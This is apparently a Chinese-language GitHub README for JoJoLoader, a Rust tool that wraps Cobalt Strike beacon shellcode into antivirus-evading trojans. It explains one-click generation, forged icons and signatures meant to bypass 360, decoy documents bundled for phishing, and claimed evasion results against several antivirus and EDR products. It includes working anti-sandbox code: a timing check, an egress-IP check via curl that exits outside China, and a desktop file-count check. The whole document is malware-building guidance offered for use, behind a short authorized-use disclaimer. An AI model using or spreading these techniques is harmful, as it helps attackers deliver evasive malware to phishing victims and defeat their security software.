![JoJoLoader](https://github.com/Pizz33/JoJoLoader/assets/88339946/dd259365-7334-43df-aee5-2d53d39c0fa9)

# JoJoLoader

助力红队成员一键生成免杀木马，使用rust实现 (by_hyyrent)

Help Redteam members generate Evasive Anti-virus software Trojan

更新说明
---
2024/08/04 优化免杀效果：360全家桶✔ 火绒✔ def✔

![image](https://github.com/user-attachments/assets/1708a617-5d70-47d5-8fae-da0b92399f10)

开发背景
---

由于近年使用go来开发loader越来越普遍，导致杀软对go编译程序静态查杀力度增大，尤其是某数字杀软

对之前的go免杀项目千机多次优化后，发现效果仍不太理想，决定重构转投入rust的怀抱，因此有了此项目的诞生！

使用方式
---

与之前开发的千机一样，同样是支持一键化生成，生成自动替换图标签名

生成`stageless payload`

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/49ddd939-32c3-495f-8ab7-a6f649a3a138)

把 `beacon_x64.bin` （习惯使用4.7以上版本的CS，默认名称即是，其他版本自行改名）放置在当前目录下

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/294efecb-b0bf-45cc-afac-7a107cac3b14)

点击 `一键生成.bat`，等待免杀木马生成

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/6ad29be8-7a42-4348-8606-113caee887f0)

输出免杀木马在 `output` 文件夹下，随机六位数命名

其中sign标签文件为自动替换签名后的免杀木马，添加图标和签名最大化bypassQVM

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/7b30c675-acb4-40ae-9045-1d92afbc97b7)

钓鱼场景-释放正常文档
---

贴合实战钓鱼场景，支持正常文件释放，捆绑文档存放在 `bundle` 文件夹下

默认放置打开损坏文档，实战根据需求自行修改代码

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/4ca87739-3dfc-4a07-bda0-0cf5b0c90505)

如果不需要捆绑文件，把对应行注释即可

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/7b5b4ed6-5f7f-431c-9502-be82a31dd74b)

程序图标
---

在 static 目录下放置了四个常见图标，可修改`icon.rc`对应名称进行调用

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/9480ea64-e78f-4ce3-bda7-a2a6bc451688)

免杀效果展示
---
**360和火绒**

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/b6fb7409-4560-493c-bf2e-a3198837ca70)

**360杀毒**

装了杀毒之后的360性能变强，qvm有时很玄学，如若碰到QVM情况尝试更换图标

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/bfc2da65-49e7-4a97-bb83-9c0420edb034)

**defender**

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/f6c49329-8cd9-48d7-af33-130fa165c3ee)

**微步**

项目发布时现测试，测试结果为安全

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/1ebe6cba-b85e-4964-843a-1f54a279f591)

卡巴斯基 ESET

国外edr会扫描内存，需要对bin进行二开，单靠loader局限性很大，以下测试是基于二开的bin

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/f5c66ab3-9034-49af-b01d-a7bc4bf12fc7)

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/5ce2e534-d1cb-4865-898b-6187dbf84d3d)

环境安装
---
https://www.rust-lang.org/zh-CN/tools/install

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/a1b8b73a-5545-4797-b2d3-b2605640b7a7)

下载安装相应的版本，双击运行，默认选择模式1进行安装，然后配置环境变量即可

![image](https://github.com/Pizz33/JoJoLoader/assets/88339946/bb0a690c-1703-4b49-8b43-20b70de024a8)

如若安装后编译失败运行以下命令

```
rustup default stable-x86_64-pc-windows-msvc
```

反沙箱
---
反沙箱不是越多越好，只保留比较好用的三个，兼容绝大部分环境，并且尽量避免上传沙箱后虚拟主机上线

### 流速检测 ###

```
pub fn flow_time() {
    use std::time::{Duration, Instant};
    use std::thread::sleep;

    let start_time = Instant::now();

    sleep(Duration::from_millis(5000));

    let elapsed_time = start_time.elapsed();

    if elapsed_time.as_millis() < 5000 {
        std::process::exit(1);
    }
}
```

这个函数判断时间是否在沙箱内进行加速

### 检查出口 IP ###

```
fn ip() {
    let output = Command::new("cmd")
        .args(&["/c", "curl -s https://myip.ipip.net/"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .expect("Failed to execute command");

    if !output.status.success() {
        std::process::exit(1);
    }

    let body = str::from_utf8(&output.stdout).expect("Failed to parse response");

    if body.contains("中国") {
    } else {
        std::process::exit(1);
    }
}
```

这个函数通过 `curl` 命令获取出口 IP，如果不在中国则退出程序

### 检查桌面文件数量 ###

```
fn check_desktop() {
    let desktop_path = get_desktop_path().expect("无法获取桌面路径");

    let entries = match fs::read_dir(&desktop_path) {
        Ok(entries) => entries,
        Err(_) => {
            std::process::exit(1);
        }
    };

    let file_count = entries.filter_map(|entry| entry.ok()).count();

    if file_count < 10 {
        std::process::exit(1);
    } else {
    }
}

fn get_desktop_path() -> Option<PathBuf> {
    let home_dir = dirs::home_dir()?;
    #[cfg(target_os = "windows")]
    return Some(home_dir.join("Desktop"));
    None
}
```
这个函数获取桌面路径并检查文件数量是否小于 10，如果小于 10 则退出程序

声明
---
- 仅限用于技术研究和获得正式授权的攻防项目，请使用者遵守《中华人民共和国网络安全法》，切勿用于任何非法活动，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布者不承担任何法律及连带责任！

- 使用前先按照文档步骤一步一步来，报错问题自行百度解决，类似issue不予回复，感谢理解！

reference
---
代码有借鉴学习以下项目，commit当晚通宵没来得及写，现补上，另外免杀性失效自行修改代码，楼主仅提供一种思路，祝玩得开心♥

https://github.com/joaoviictorti/RustRedOps

https://github.com/xiao-zhu-zhu/RustBypassMap
